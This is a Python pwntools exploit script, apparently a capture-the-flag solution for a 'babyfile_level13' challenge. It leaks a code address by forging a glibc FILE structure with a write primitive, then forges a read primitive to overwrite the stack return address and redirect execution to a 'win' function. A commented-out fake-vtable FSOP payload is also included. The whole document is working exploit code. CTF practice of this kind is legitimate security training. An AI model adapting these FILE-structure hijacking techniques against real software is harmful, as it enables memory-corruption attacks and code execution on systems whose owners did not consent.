#!/usr/bin/env python3
from pwn import *
import sys
import os
import socks
import socket
# Cre: Broder

_libc = "./libc.so.6"
_ld = "./ld-linux-x86-64.so.2"

HOST = 'localhost'
port = 1337
_arch = 64

user = os.getenv('USER')
if user == 'broder':
    binary = "./babyfile_level13_patched"
else:
    binary = "/challenge/babyfile_level13"
    
context.log_level = 'debug'
context.binary = elf = ELF(binary, checksec=False)

if user == 'broder':
    libc = ELF(_libc, checksec=False)
    _ld = ELF(_ld, checksec=False)
else:
    libc = elf.libc

environ = {
    'LD_PRELOAD': os.path.join(os.getcwd(), './libc.so.6'),
    'LD_LIBRARY_PATH': os.path.join(os.getcwd(), './')
}

gs = f"""
set solib-search-path {os.getcwd()}
b *main
b *challenge
"""

info        = lambda msg: log.info(msg)
success     = lambda msg: log.success(msg)
error       = lambda msg: log.error(msg)
sla         = lambda msg, data: io.sendlineafter(msg, data)
sa          = lambda msg, data: io.sendafter(msg, data)
sl          = lambda data: io.sendline(data)
s           = lambda data: io.send(data)
rcu         = lambda data: io.recvuntil(data)

def p(_data):
    if(_arch == 64):
        return p64(_data, endian = 'little')
    return p32(_data, endian = 'little')

def stop():
    if args.GDB:
        pause()

def start():
    if args.GDB:
        if args.VSCODE:
            context.terminal = ["/home/broder/.vscode-terminal"]
        return gdb.debug(elf.path, gdbscript=gs)
        # return gdb.debug(elf.path, env=environ, gdbscript=gs)
    elif args.REMOTE:
        return remote(HOST, port)
    else:
        return process(elf.path)
        # return process(elf.path, env=environ)

io = start()
io.timeout = 0.1
rcu(b'[LEAK] The address of cmd where you are writing to is: ')
stack = int(io.recvline().strip(), 16)
success(f"Stack: {hex(stack)}")

sla(b'> ', b'open_file')
rcu(b'fp = fopen("/tmp/babyfile.txt", "r+") = ')
fp = int(io.recvline().strip(), 16)
success(f"fp @ {hex(fp)}")
fs = FileStructure()
# payload = fs.write(stack + 24, 20) # for leak libc @ _IO_2_1_stdout_
payload = fs.write(stack + 0x70, 20) # for leak libc @ _IO_2_1_stdout_

sla(b'> ', b'new_note') # 0
sla(b'Which note? (0-10)\n> ', b'0')
sla(b'How many bytes to the note?\n> ', str(len(payload)).encode())
rcu(b'notes[0] = ')
note = int(rcu(b';')[:-1], 16)
success(f"note @ {hex(note)}")

sla(b'> ', b'write_fp')
s(payload)

sla(b'> ', b'write_file')   # 0
sla(b'Which note? (0-10)\n> ', b'0')

rcu(b'fwrite(notes[0], 1, 115, fp);\n')
leak = u64(io.recv(6) + b'\x00\x00')
win = leak - 0xe17
success(f"Leak: {hex(leak)}")
success(f"Win: {hex(win)}")

sla(b'> ', b'open_file')
rcu(b'fp = fopen("/tmp/babyfile.txt", "r+") = ')
fp = int(io.recvline().strip(), 16)
success(f"fp @ {hex(fp)}")

ret_addr = stack + 136 + 8 + 8
success(f"ret_addr @ {hex(ret_addr)}")
fs = FileStructure()
payload = fs.read(ret_addr, 20)

sla(b'> ', b'write_fp')
s(payload)

sla(b'> ', b'read_file')   # 0
sla(b'Which note? (0-10)\n> ', b'0')
count = 0
while True:
    s(p(win))
    count += 1
    try:
        res = io.recvline()
        if b'[*] Commands:' in res:
            info(f"Count: {count}")
            break
    except:
        pass
    

# rcu(b'fwrite(notes[0], 1, 115, fp);\n\n')
# rcu(b'\x00' * 7)
# _stdout = u64(io.recv(6) + b'\x00\x00')
# success(f"_IO_2_1_stdout_: {hex(_stdout)}")
# libc.address = _stdout - libc.sym['_IO_2_1_stdout_']
# success(f"Libc: {hex(libc.address)}")

# sla(b'> ', b'open_file')
# rcu(b'fp = fopen("/tmp/babyfile.txt", "r+") = ')
# fp = int(io.recvline().strip(), 16)
# success(f"fp @ {hex(fp)}")

# if user == 'broder':
#     fake_vtable = libc.sym['_IO_wfile_jumps_maybe_mmap'] + 160
# else:
#     fake_vtable = libc.address + 0x1e8de0
# success(f"fake_vtable @ {hex(fake_vtable)}")
# win 
# buffer = fp
# _wide_data = buffer - 224
# _wide_data += 16
# fs = b'password' # password
# fs += b'\x00' * 8
# fs += p(buffer + 24 - 0x68)     # _wide_data.vtable
# fs += p(win)
# fs += p(0) * (1 + 12 - len(fs) // 8)
# fs += p(libc.sym['_IO_2_1_stderr_'])
# fs += p32(3) + p8(0) * 20
# fs += p(libc.address + 0x1ec000)           # lock
# fs += p(0xffffffffffffffff)
# fs += p(0)
# fs += p(_wide_data)
# fs += p(0) * 4
# fs += p8(0) * 16
# fs += p(fake_vtable)

io.interactive()
